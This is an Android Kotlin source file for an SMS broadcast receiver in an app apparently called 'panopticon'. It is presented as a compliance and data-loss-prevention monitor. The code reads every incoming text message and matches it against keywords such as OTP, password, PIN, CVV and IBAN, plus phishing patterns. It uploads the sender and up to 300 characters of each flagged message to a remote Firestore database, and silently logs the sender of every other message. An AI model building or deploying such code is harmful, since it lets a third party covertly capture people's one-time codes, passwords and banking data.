package com.abdelrahman.panopticon

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.telephony.SmsMessage
import android.util.Log
import com.google.firebase.firestore.FieldValue
import com.google.firebase.firestore.FirebaseFirestore

/**
 * SmsInterceptorReceiver — معترض الرسائل النصية
 *
 * يُنشَّط عند وصول رسالة SMS جديدة (SMS_RECEIVED).
 * يُحلِّل محتوى الرسالة:
 *  1. فحص DLP — كلمات مفتاحية حساسة (OTP، كلمات مرور، بيانات بنكية)
 *  2. كشف التصيد — روابط مشبوهة وأنماط احتيال شائعة
 *  3. رفع السجلات لـ Firestore: `compliance_assets/{uid}/sms_intercepts`
 *
 * ملاحظة: يحتاج التطبيق أن يكون التطبيق الافتراضي للـ SMS
 * أو أن يمتلك READ_SMS + RECEIVE_SMS للاطلاع على المحتوى.
 */
class SmsInterceptorReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG    = "SmsInterceptor"
        private const val PREF_FILE = CommandListenerService.PREF_FILE
        private const val PREF_UID  = CommandListenerService.PREF_UID

        /** أنماط التصيد — تعابير منتظمة مبسَّطة */
        private val PHISHING_PATTERNS = listOf(
            Regex("""https?://bit\.ly"""),
            Regex("""https?://tinyurl\.com"""),
            Regex("""https?://t\.co"""),
            Regex("""(?i)(click|اضغط|verify|تحقق|urgent|عاجل|won|فزت|prize|جائزة)"""),
            Regex("""(?i)(bank|بنك|credit|بطاقة|debit|رصيد|account|حساب).*\d{4,}"""),
        )

        /** كلمات DLP في SMS */
        private val DLP_KEYWORDS = listOf(
            "otp", "رمز التحقق", "password", "كلمة مرور",
            "pin", "iban", "swift", "بطاقة", "cvv",
            "token", "مفتاح", "secret", "سري",
        )
    }

    private val db by lazy { FirebaseFirestore.getInstance() }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION &&
            intent.action != "android.provider.Telephony.SMS_RECEIVED") return

        val uid = context
            .getSharedPreferences(PREF_FILE, Context.MODE_PRIVATE)
            .getString(PREF_UID, null) ?: return

        val messages = extractMessages(intent)
        if (messages.isEmpty()) return

        for (sms in messages) {
            processSms(uid, sms)
        }
    }

    private fun extractMessages(intent: Intent): List<SmsMessage> {
        return try {
            Telephony.Sms.Intents.getMessagesFromIntent(intent).toList()
        } catch (e: Exception) {
            Log.w(TAG, "فشل استخراج الرسائل: ${e.message}")
            emptyList()
        }
    }

    private fun processSms(uid: String, sms: SmsMessage) {
        val sender  = sms.originatingAddress ?: "unknown"
        val body    = sms.messageBody ?: return
        val bodyLow = body.lowercase()

        val matchedKeywords   = DLP_KEYWORDS.filter { bodyLow.contains(it.lowercase()) }
        val matchedPatterns   = PHISHING_PATTERNS.filter { it.containsMatchIn(body) }
            .map { it.pattern.take(50) }
        val hasPhishing       = matchedPatterns.isNotEmpty()
        val hasDlp            = matchedKeywords.isNotEmpty()

        if (!hasPhishing && !hasDlp) {
            // رسالة عادية — سجّل فقط للإحصاء بدون محتوى
            logBasicSms(uid, sender)
            return
        }

        Log.w(TAG, "⚠ SMS مُعلَّمة — المُرسِل: $sender | DLP: $matchedKeywords | Phishing: $matchedPatterns")

        val severity = when {
            hasPhishing && hasDlp -> "critical"
            hasPhishing           -> "high"
            else                  -> "medium"
        }

        val record = hashMapOf(
            "type"             to "sms_intercept",
            "sender"           to sender,
            "preview"          to body.take(300),
            "matchedKeywords"  to matchedKeywords,
            "matchedPatterns"  to matchedPatterns,
            "hasPhishing"      to hasPhishing,
            "hasDlp"           to hasDlp,
            "severity"         to severity,
            "timestamp"        to FieldValue.serverTimestamp(),
            "receivedAt"       to sms.timestampMillis,
        )

        db.collection("compliance_assets")
            .document(uid)
            .collection("sms_intercepts")
            .add(record)
            .addOnFailureListener { e ->
                Log.w(TAG, "فشل رفع سجل SMS: ${e.message}")
            }
    }

    private fun logBasicSms(uid: String, sender: String) {
        // سجّل عدد الرسائل فقط — بدون محتوى للخصوصية الداخلية
        db.collection("compliance_assets")
            .document(uid)
            .collection("sms_intercepts")
            .add(hashMapOf(
                "type"      to "sms_count_log",
                "sender"    to sender,
                "severity"  to "info",
                "timestamp" to FieldValue.serverTimestamp(),
            ))
            .addOnFailureListener { } // صامت
    }
}
